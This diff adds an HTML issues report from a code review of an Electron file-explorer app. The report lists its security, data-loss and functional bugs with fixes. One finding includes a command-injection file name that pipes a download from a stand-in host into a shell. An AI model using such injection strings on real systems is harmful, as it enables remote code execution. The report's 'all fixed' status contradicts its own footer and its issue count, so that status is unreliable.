@@ -1,0 +1,299 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tulip Issues Report</title>
+<style>
+:root{
+  --bg:#f7f7f8;--surface:#ffffff;--text:#1b1d22;--muted:#5d6370;--border:#e2e4e9;--code:#f0f1f4;
+  --crit:#b42318;--crit-bg:#fdecea;--high:#b54708;--high-bg:#fef3e6;--med:#1d5fb8;--med-bg:#e8f0fc;--low:#4b5563;--low-bg:#eef0f3;
+  --accent:#1d5fb8;
+}
+@media (prefers-color-scheme: dark){
+  :root:not([data-theme="light"]){
+    --bg:#121317;--surface:#1b1d22;--text:#e8eaef;--muted:#9aa1ae;--border:#2c2f37;--code:#24272e;
+    --crit:#ff7b72;--crit-bg:#3a1a19;--high:#f5a35c;--high-bg:#3a2715;--med:#7cb2ff;--med-bg:#172a45;--low:#b4bac5;--low-bg:#272a31;--accent:#7cb2ff;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#121317;--surface:#1b1d22;--text:#e8eaef;--muted:#9aa1ae;--border:#2c2f37;--code:#24272e;
+  --crit:#ff7b72;--crit-bg:#3a1a19;--high:#f5a35c;--high-bg:#3a2715;--med:#7cb2ff;--med-bg:#172a45;--low:#b4bac5;--low-bg:#272a31;--accent:#7cb2ff;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font:15px/1.55 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+.wrap{max-width:1040px;margin:0 auto;padding:32px 16px 64px}
+h1{font-size:1.7rem;margin:0 0 4px}
+.sub{color:var(--muted);margin:0 0 24px}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:24px}
+.stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:14px 16px}
+.stat b{display:block;font-size:1.6rem;font-variant-numeric:tabular-nums}
+.stat span{color:var(--muted);font-size:.85rem}
+.stat.crit b{color:var(--crit)}.stat.high b{color:var(--high)}.stat.med b{color:var(--med)}.stat.low b{color:var(--low)}
+.controls{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:16px;position:sticky;top:0;background:var(--bg);padding:10px 0;z-index:2}
+.controls input,.controls select{font:inherit;color:var(--text);background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:7px 10px;min-width:0}
+.controls input{flex:1 1 220px}
+.chip{font:inherit;font-size:.85rem;border:1px solid var(--border);background:var(--surface);color:var(--text);border-radius:999px;padding:5px 12px;cursor:pointer}
+.chip[aria-pressed="true"]{border-color:var(--accent);color:var(--accent);font-weight:600}
+.issue{background:var(--surface);border:1px solid var(--border);border-left-width:4px;border-radius:10px;padding:14px 16px;margin-bottom:10px}
+.issue.critical{border-left-color:var(--crit)}.issue.high{border-left-color:var(--high)}.issue.medium{border-left-color:var(--med)}.issue.low{border-left-color:var(--low)}
+.issue h3{margin:0 0 6px;font-size:1rem;display:flex;gap:8px;align-items:baseline;flex-wrap:wrap}
+.id{color:var(--muted);font-variant-numeric:tabular-nums;font-weight:500}
+.tag{font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.03em;border-radius:4px;padding:2px 6px}
+.tag.critical{color:var(--crit);background:var(--crit-bg)}.tag.high{color:var(--high);background:var(--high-bg)}.tag.medium{color:var(--med);background:var(--med-bg)}.tag.low{color:var(--low);background:var(--low-bg)}
+.tag.cat{color:var(--muted);background:var(--code);text-transform:none;font-weight:500}
+.loc{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.8rem;color:var(--muted);overflow-wrap:anywhere;margin:0 0 6px}
+.issue p{margin:4px 0}
+.fix{color:var(--muted)}.fix b{color:var(--text)}
+code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.85em;background:var(--code);padding:1px 4px;border-radius:4px;overflow-wrap:anywhere}
+.empty{color:var(--muted);text-align:center;padding:32px}
+footer{color:var(--muted);font-size:.85rem;margin-top:32px}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>Tulip File Explorer — Issues Report</h1>
+  <p class="sub">Static review of <code>electron/</code>, <code>src/</code>, build config, dependencies. Version 1.4.3-2, commit <code>2208445</code>. Reviewed 2026-09-29.</p>
+  <p class="sub"><b>Status:</b> all 44 issues fixed on branch <code>claude/quirky-carson-5bppor</code>. Verified with ESLint, 32 Vitest tests, <code>npm audit</code> (0 vulnerabilities) and an Electron smoke test.</p>
+
+  <div class="stats" id="stats"></div>
+
+  <div class="controls">
+    <input id="q" type="search" placeholder="Filter issues…" aria-label="Filter issues">
+    <select id="cat" aria-label="Category"><option value="">All categories</option></select>
+    <span id="sevChips"></span>
+  </div>
+
+  <div id="list"></div>
+
+  <footer>
+    Verification: <code>vite build</code> passes. <code>npm audit</code>: 34 vulnerabilities (2 critical, 26 high, 5 moderate, 1 low). ESLint cannot run (packages missing). No automated tests exist. Line numbers refer to commit <code>2208445</code>.
+  </footer>
+</div>
+
+<script>
+const ISSUES = [
+// ---------- CRITICAL ----------
+{s:"critical",c:"Security",t:"Shell command injection via file names",
+ l:"electron/main.cjs:361, 423, 712-716, 743 · electron/fileSystem.cjs:324, 335",
+ d:"File paths interpolated into <code>exec()</code> strings wrapped in double quotes: ffprobe (video preview), zip, Open With, archive manager, <code>attrib</code>. File named <code>a$(curl evil|sh).mp4</code> or containing <code>\"</code> runs arbitrary commands when merely selected with preview panel open.",
+ f:"Use <code>execFile</code>/<code>spawn</code> with argument arrays, never shell strings."},
+{s:"critical",c:"Data loss",t:"Context-menu Delete/Cut/Copy act on stale selection",
+ l:"src/components/FileExplorer/FileExplorer.jsx:430 · src/components/FileItem/FileItem.jsx:69-73",
+ d:"<code>handleContextMenu</code> reads <code>selectedItems</code> from closure captured before right-click. Select file A, right-click file B, choose Delete → A trashed, not B. Confirm dialog shows no file name, so user can't notice.",
+ f:"Compute targets from clicked item + current selection (functional state or ref); show names in confirm dialog."},
+{s:"critical",c:"Functional",t:"Rename completely broken",
+ l:"src/hooks/useFileSystem.js:255 · electron/preload.cjs:36",
+ d:"Hook calls <code>window.electronAPI.renameFile()</code>; preload exposes <code>renameItem</code>. Every rename (context menu, Properties dialog) throws <code>TypeError</code>.",
+ f:"Call <code>renameItem</code>, or rename preload key. Add a smoke test."},
+{s:"critical",c:"Data loss",t:"\"New File\" truncates existing file",
+ l:"electron/main.cjs:629-637 · FileExplorer.jsx:466",
+ d:"Always creates <code>New Text Document.txt</code> via <code>fs.writeFile(path, '')</code>. If that file exists, content wiped silently.",
+ f:"Use <code>{flag:'wx'}</code> and auto-increment name (<code>New Text Document (2).txt</code>)."},
+
+// ---------- HIGH ----------
+{s:"high",c:"Data loss",t:"Rename / Hide silently overwrite existing targets",
+ l:"electron/main.cjs:440-449 · electron/fileSystem.cjs:437-463",
+ d:"<code>fs.rename</code> replaces destination on Linux/macOS. Renaming to an existing name, or hiding <code>x</code> when <code>.x</code> exists, destroys the other file. No name validation (<code>/</code>, <code>..</code>, empty).",
+ f:"Check existence first (or <code>fs.link</code>+unlink), validate names, reject path separators."},
+{s:"high",c:"Security",t:"eval() on ffprobe output",
+ l:"electron/main.cjs:376",
+ d:"<code>eval(videoStream.r_frame_rate)</code> in main process with full Node access. Value derived from untrusted media file.",
+ f:"Parse <code>num/den</code> manually."},
+{s:"high",c:"Security",t:"Weak Electron hardening",
+ l:"electron/main.cjs:112-117, 834-841 · electron/preload.cjs",
+ d:"<code>webSecurity:false</code>; no <code>will-navigate</code> / <code>setWindowOpenHandler</code> guards; <code>open-external</code> forwards any URL (<code>file://</code>, custom protocol handlers) to <code>shell.openExternal</code>; preload exposes unrestricted read/write/delete/open of any path. Any renderer compromise = full user-level access.",
+ f:"Enable webSecurity, explicit <code>sandbox:true</code>, block navigation, allow-list <code>https:</code> in openExternal, validate IPC args."},
+{s:"high",c:"Data loss",t:"Paste: recursion, cross-device move, swallowed errors",
+ l:"electron/main.cjs:472-540 · src/hooks/useFileSystem.js:291-299",
+ d:"Pasting folder into itself/its child → <code>copyDirectory</code> recurses forever, filling disk. Cut across drives uses <code>fs.rename</code> → <code>EXDEV</code> failure. Handler returns <code>success:true</code> even when every item failed; UI never reports errors. Symlinks copied as file contents.",
+ f:"Reject dest inside source; fallback copy+delete on EXDEV; surface per-item errors; use <code>fs.cp</code>."},
+{s:"high",c:"Functional",t:"Every refresh wipes Back/Forward history",
+ l:"src/hooks/useFileSystem.js:198-209, 91-96",
+ d:"<code>refresh()</code> calls <code>navigateToPath(currentPath, true)</code>; <code>isInitial</code> resets history to <code>[path]</code>. Any delete, rename, create, paste or F5 kills navigation history.",
+ f:"Separate reload function that does not touch history."},
+{s:"high",c:"Dependencies",t:"Electron 28 end-of-life; 34 audited vulnerabilities",
+ l:"package.json",
+ d:"Electron 28 out of support since 2024 (Chromium/Node CVEs unpatched). <code>npm audit</code>: 2 critical, 26 high (electron, xmldom, babel, picomatch…).",
+ f:"Upgrade Electron to supported major, run <code>npm audit fix</code>, add Dependabot."},
+{s:"high",c:"Performance",t:"Preview loads whole files into memory",
+ l:"electron/main.cjs:640-699",
+ d:"Text preview <code>readFile</code>s entire file then slices 50 KB — multi-GB <code>.log</code> freezes/crashes main process. Images base64-encoded in full (100 MB PNG → ~133 MB string over IPC).",
+ f:"Read first N bytes via file handle; use thumbnails or <code>file://</code>/custom protocol for images; size caps."},
+{s:"high",c:"Rclone",t:"Mount lifecycle unreliable",
+ l:"electron/rcloneManager.cjs:88-94, 58-138, 157-195",
+ d:"Non-empty mount dir triggers <code>unmountRemote</code>, which <code>rmdir</code>s the dir → subsequent mount into missing dir fails. <code>exec</code> spawns a shell; <code>process.kill()</code> kills shell, leaving <code>rclone</code> orphaned (esp. Windows). Success decided by 3 s timer, not actual mount check. Mounts lost on restart. Windows unmount uses Linux-style path.",
+ f:"<code>spawn('rclone', args)</code> directly, verify mount via mountpoint/stat, recreate dir, track PID."},
+{s:"high",c:"Stability",t:"App quit can hang forever",
+ l:"electron/main.cjs:850-855",
+ d:"<code>will-quit</code> prevents default then awaits <code>unmountAll()</code> without try/timeout. Hung <code>fusermount</code> or thrown error → app never exits.",
+ f:"Wrap in try/finally with timeout, then <code>app.exit()</code>."},
+
+// ---------- MEDIUM ----------
+{s:"medium",c:"Functional",t:"Context-menu \"Open\" opens file twice",
+ l:"electron/main.cjs:549 · FileExplorer.jsx:432",
+ d:"Main process calls <code>shell.openPath</code> in click handler and resolves <code>'open'</code>; renderer then calls <code>onOpenFile</code> again.",
+ f:"Only resolve action; let renderer open."},
+{s:"medium",c:"Performance",t:"Redundant polling (3 independent timers)",
+ l:"electron/main.cjs:39-65 · ThisPC.jsx:43-58 · App.jsx:76-87",
+ d:"Main polls drives + runs <code>df</code> per rclone mount every 3 s; This PC polls <code>getDrives</code> every 3 s; renderer polls clipboard every 2 s. <code>df</code> on stalled cloud mount blocks. ThisPC replaces item list with raw drives lacking <code>isDrive</code> → JSON compare always differs, Properties shows wrong type.",
+ f:"Single push channel from main; event-driven clipboard state; debounce."},
+{s:"medium",c:"Functional",t:"Navigation race conditions",
+ l:"src/hooks/useFileSystem.js:65-157",
+ d:"No request ID/cancellation: slow folder response can overwrite later navigation. Back/Forward promise chains lack <code>catch</code> → rejection leaves spinner forever; errors not shown.",
+ f:"Track latest request token; unify through one navigate function with error handling."},
+{s:"medium",c:"Performance",t:"Slow directory listing; symlinks mishandled",
+ l:"electron/fileSystem.cjs:239-294",
+ d:"Sequential <code>await fs.stat</code> per entry (10k-file folders crawl, especially on network/rclone). Uses <code>Dirent.isDirectory()</code> → symlinked folders shown as files; broken links flagged error.",
+ f:"Parallel stat with concurrency limit; resolve symlinks via <code>stat</code> result."},
+{s:"medium",c:"Performance",t:"Thumbnail pipeline inefficiencies",
+ l:"electron/main.cjs:77-99, 258-311 · FileItem.jsx:6-59",
+ d:"Synchronous <code>nativeImage.createFromPath</code> blocks main process per image, no concurrency limit. Disk cache never pruned. Generates JPEG buffer <i>and</i> PNG dataURL (returns PNG, caches JPEG). Dead helpers <code>getFileHash</code>/<code>getCachePath</code>. Renderer <code>thumbnailCache</code> Map unbounded, keyed by path only → stale thumbnail after edit.",
+ f:"Worker/queue, LRU caches keyed by path+mtime, return cached format consistently."},
+{s:"medium",c:"Functional",t:"Video thumbnails never work",
+ l:"FileItem.jsx:30-33 · main.cjs:283",
+ d:"Renderer requests thumbnails for video extensions; <code>nativeImage</code> cannot decode video → always fails after an IPC round-trip. README advertises video thumbnails.",
+ f:"Use ffmpeg frame grab or drop video from request list."},
+{s:"medium",c:"Functional",t:"file:// URLs built by string concatenation",
+ l:"PreviewPanel.jsx:123, 132 · PropertiesModal.jsx:142",
+ d:"<code>`file://${path}`</code> breaks for paths with <code>#</code>, <code>?</code>, <code>%</code>, spaces on some platforms, and Windows backslash paths (<code>file://C:\\...</code>).",
+ f:"Use <code>url.pathToFileURL()</code> (via preload) or a custom protocol."},
+{s:"medium",c:"Functional",t:"Breadcrumb broken on This PC & UNC paths",
+ l:"src/components/Breadcrumb/Breadcrumb.jsx:8-27 · useFileSystem.js:159-181",
+ d:"<code>thispc://</code> renders crumb \"thispc:\" → click navigates to <code>/thispc:</code> (error). UNC paths (<code>\\\\server\\share</code>) lose leading slashes in breadcrumb and Up.",
+ f:"Special-case virtual paths; use <code>path.parse</code> via preload."},
+{s:"medium",c:"Functional",t:"Cloud drives never shown in This PC",
+ l:"FileExplorer.jsx:858 · ThisPC.jsx:209",
+ d:"FileExplorer passes <code>cloudDrives={[]}</code>; section never renders. ThisPC reads <code>drive.provider</code>, data uses <code>type</code>.",
+ f:"Pass real <code>cloudDrives</code>; use <code>drive.type</code>."},
+{s:"medium",c:"Functional",t:"ThisPC calls missing API getSpecialPath",
+ l:"src/components/ThisPC/ThisPC.jsx:97",
+ d:"<code>window.electronAPI.getSpecialPath</code> not exposed in preload → TypeError whenever fallback library list used.",
+ f:"Remove fallback or add IPC."},
+{s:"medium",c:"Functional",t:"This PC folder context actions silently ignored",
+ l:"src/components/ThisPC/ThisPC.jsx:120-133",
+ d:"Library cards show full folder menu (Cut, Copy, Rename, Delete), but only Open/Properties handled. Other actions do nothing.",
+ f:"Use limited menu type for libraries or implement actions."},
+{s:"medium",c:"UI",t:"Full drives show no capacity / 0% usage",
+ l:"src/utils/formatters.js:132-147",
+ d:"<code>formatDriveCapacity</code> and <code>getDriveUsagePercent</code> test <code>!drive.free</code>; a 100%-full drive (free = 0) shows empty text and 0% bar — exactly when warning matters most.",
+ f:"Check <code>drive.free == null</code>."},
+{s:"medium",c:"Functional",t:"New Folder fails when name exists; no inline rename",
+ l:"FileExplorer.jsx:463-466 · main.cjs:618-626",
+ d:"Fixed name <code>New Folder</code>; second creation fails with EEXIST, error swallowed. No rename prompt after creation.",
+ f:"Unique name generation, auto-enter rename mode."},
+{s:"medium",c:"UX",t:"Errors hidden from user",
+ l:"RcloneModal.jsx:39-52 · useFileSystem.js · main.cjs:762-773",
+ d:"Mount failure only <code>console.error</code>. Rename/create/delete/paste failures never displayed. Rclone not installed → shows \"No cloud drives configured\" instead of install hint. Zip uses blocking <code>alert()</code>.",
+ f:"Toast/notification system; surface <code>checkInstalled()</code> result."},
+{s:"medium",c:"Functional",t:"Clipboard semantics non-standard",
+ l:"electron/main.cjs:456-523",
+ d:"Private in-memory clipboard; no interop with OS clipboard (can't paste from/to other file managers). Copy cleared after one paste. Cut+paste into same folder renames to <code>name (1)</code>. Paste enabled on This PC virtual path.",
+ f:"Keep copy buffer after paste; no-op same-dir cut; integrate OS clipboard file lists where possible."},
+{s:"medium",c:"Functional",t:"Properties dialog defects",
+ l:"src/components/PropertiesModal/PropertiesModal.jsx",
+ d:"Enter triggers rename, then <code>onBlur</code> triggers again (second call fails). Item stale after rename/hide (path changed). Hide on Unix renames file without refreshing list. Read-only always false. Cloud drives labelled \"Local Disk\". Folder-size scan continues after close; no cancel.",
+ f:"Guard double submit, refresh item post-change, real permission check, cancellable stats."},
+{s:"medium",c:"Functional",t:"Preview panel race",
+ l:"src/components/PreviewPanel/PreviewPanel.jsx:15-57",
+ d:"No cancellation flag; quick arrow-key selection lets older preview/metadata overwrite newer.",
+ f:"Ignore results when item changed (cleanup flag / AbortController)."},
+{s:"medium",c:"Functional",t:"Keyboard handling gaps",
+ l:"FileExplorer.jsx:204-307 · README.md",
+ d:"README documents F2 (rename) and Alt+Enter (properties) — neither implemented. No Enter/Backspace navigation. Ctrl+A selects items hidden by search filter (uses <code>items</code>, not <code>processedItems</code>). Delete/Ctrl+V fire while modals open. <code>querySelector(`[data-path=\"${path}\"]`)</code> throws for paths containing quotes/backslashes.",
+ f:"Implement shortcuts, scope to explorer focus, use <code>CSS.escape</code>."},
+{s:"medium",c:"Functional",t:"Date sort direction inverted",
+ l:"FileExplorer.jsx:186",
+ d:"<code>new Date(b) - new Date(a)</code> under \"asc\" → ascending shows newest first; arrows mislabeled.",
+ f:"Use <code>a - b</code>."},
+{s:"medium",c:"Stability",t:"Drive watcher issues",
+ l:"electron/main.cjs:14-75",
+ d:"<code>fs.watch({recursive:true})</code> unsupported on Linux in Electron 28's Node 18 → throws (caught, useless). Recursive watch of <code>/mnt</code> on WSL = whole Windows disks. Watchers never closed (leak on macOS window re-create). <code>drives-changed</code> event has no renderer listener.",
+ f:"Non-recursive watch, close on window close, remove dead event."},
+{s:"medium",c:"Stability",t:"Video metadata can hang or reject",
+ l:"electron/main.cjs:348-392",
+ d:"<code>statSync</code> inside Promise executor throws for missing files; ffprobe has no timeout — hangs on slow network mounts; missing ffprobe silently ignored.",
+ f:"Async stat with try/catch; <code>execFile</code> with <code>timeout</code>."},
+{s:"medium",c:"Performance",t:"Folder size scan unbounded",
+ l:"electron/fileSystem.cjs:347-375",
+ d:"Recursive sequential scan, no depth/time limit, no cancel; Properties on <code>/</code> or a cloud mount runs for minutes and keeps going after dialog closes.",
+ f:"Cancellable job with progress, concurrency, and abort on close."},
+
+// ---------- LOW ----------
+{s:"low",c:"Tooling",t:"Lint cannot run; no tests; no CI",
+ l:"eslint.config.js · package.json",
+ d:"ESLint config imports <code>eslint</code>, <code>@eslint/js</code>, <code>globals</code>, react plugins — none in devDependencies; no <code>lint</code> script. Zero tests, no CI workflow. Bugs like <code>renameFile</code> would be caught by either.",
+ f:"Add devDeps + <code>lint</code> script, Vitest/Playwright smoke tests, GitHub Actions."},
+{s:"low",c:"Docs",t:"README claims features that don't exist",
+ l:"README.md",
+ d:"Claims syntax highlighting, PDF preview, video thumbnails, Linux AppImage (config builds only <code>deb</code>), F2/Alt+Enter. States MIT but no <code>LICENSE</code> file.",
+ f:"Align README with reality; add LICENSE."},
+{s:"low",c:"Maintainability",t:"Hardcoded / inconsistent metadata",
+ l:"SettingsModal.jsx:102 · index.html:9 · main.cjs:565",
+ d:"Version duplicated in Settings (drifts from package.json). Window title \"Pro\" vs app name elsewhere. \"Open in new window\" just opens in same window.",
+ f:"Inject version at build; remove or implement new-window."},
+{s:"low",c:"Maintainability",t:"Dead code & build config leftovers",
+ l:"useFileSystem.js:287-289 · useTheme.js · fileSystem.cjs:30 · main.cjs:418-438 · package.json build.directories",
+ d:"Unused <code>copyToClipboard</code>/<code>clipboard</code> state, <code>toggleTheme</code>, <code>useWmic</code>, <code>open-with</code> handler (menu item removed), duplicate <code>getDriveStats</code>, <code>readDirectory</code> declared twice in preload. <code>buildResources: \"assets\"</code> dir doesn't exist.",
+ f:"Remove; point buildResources to <code>build</code>."},
+{s:"low",c:"Compatibility",t:"WMIC deprecated on Windows",
+ l:"electron/fileSystem.cjs:40-89",
+ d:"WMIC removed by default on Windows 11 24H2+ → falls back to sequential A–Z probe (slow, can stall on disconnected network drives). CSV parse breaks on volume labels containing commas.",
+ f:"Use PowerShell <code>Get-CimInstance</code> JSON or <code>fs.statfs</code> per letter in parallel."},
+{s:"low",c:"UI",t:"Formatter edge cases",
+ l:"src/utils/formatters.js",
+ d:"<code>formatFileSize</code> ≥1 PB or negative → \"undefined\". \"Today/Yesterday\" based on 24 h difference, not calendar day; future dates mislabeled.",
+ f:"Clamp unit index; compare calendar dates."},
+{s:"low",c:"Accessibility",t:"Keyboard & screen-reader gaps",
+ l:"ThisPC.jsx · Sidebar.jsx · modals",
+ d:"Drive/library cards are <code>div</code>s with <code>onClick</code> (not focusable). Modals lack focus trap, Escape-to-close, <code>role=dialog</code>/<code>aria-modal</code>. Icon-only buttons rely on <code>title</code>.",
+ f:"Use buttons, add ARIA roles and focus management."},
+{s:"low",c:"Security",t:"CSP allows inline scripts",
+ l:"index.html:7-8",
+ d:"<code>script-src 'unsafe-inline'</code> weakens XSS defense; unnecessary for Vite production bundle.",
+ f:"Drop <code>'unsafe-inline'</code> for scripts in production."},
+{s:"low",c:"Stability",t:"Startup side effects & fragile storage reads",
+ l:"rcloneManager.cjs:8-17 · App.jsx:16-19",
+ d:"Creates <code>~/TulipMounts</code> on every launch, even without rclone. <code>JSON.parse(localStorage…)</code> without try — corrupt value crashes renderer on start.",
+ f:"Create dir lazily on mount; guard parse."},
+];
+
+const SEV = ["critical","high","medium","low"];
+const LABEL = {critical:"Critical",high:"High",medium:"Medium",low:"Low"};
+ISSUES.forEach((x,i)=>x.id=i+1);
+
+const stats = document.getElementById("stats");
+stats.innerHTML = `<div class="stat"><b>${ISSUES.length}</b><span>Total issues</span></div>` +
+  SEV.map(s=>`<div class="stat ${s==='medium'?'med':s==='critical'?'crit':s}"><b>${ISSUES.filter(x=>x.s===s).length}</b><span>${LABEL[s]}</span></div>`).join("");
+
+const catSel = document.getElementById("cat");
+[...new Set(ISSUES.map(x=>x.c))].sort().forEach(c=>{const o=document.createElement("option");o.value=c;o.textContent=c;catSel.appendChild(o);});
+
+const active = new Set(SEV);
+const chips = document.getElementById("sevChips");
+SEV.forEach(s=>{
+  const b=document.createElement("button");b.className="chip";b.textContent=LABEL[s];b.setAttribute("aria-pressed","true");
+  b.onclick=()=>{active.has(s)?active.delete(s):active.add(s);b.setAttribute("aria-pressed",active.has(s));render();};
+  chips.appendChild(b);chips.appendChild(document.createTextNode(" "));
+});
+
+const strip = h => h.replace(/<[^>]+>/g,"");
+function render(){
+  const q = document.getElementById("q").value.trim().toLowerCase();
+  const c = catSel.value;
+  const rows = ISSUES.filter(x=>active.has(x.s) && (!c||x.c===c) &&
+    (!q || strip(x.t+" "+x.l+" "+x.d+" "+x.f+" "+x.c).toLowerCase().includes(q)));
+  document.getElementById("list").innerHTML = rows.length ? rows.map(x=>`
+    <article class="issue ${x.s}">
+      <h3><span class="id">#${x.id}</span>${x.t}<span class="tag ${x.s}">${LABEL[x.s]}</span><span class="tag cat">${x.c}</span></h3>
+      <p class="loc">${x.l}</p>
+      <p>${x.d}</p>
+      <p class="fix"><b>Fix:</b> ${x.f}</p>
+    </article>`).join("") : `<p class="empty">No issues match.</p>`;
+}
+document.getElementById("q").addEventListener("input",render);
+catSel.addEventListener("change",render);
+render();
+</script>
+</body>
+</html>
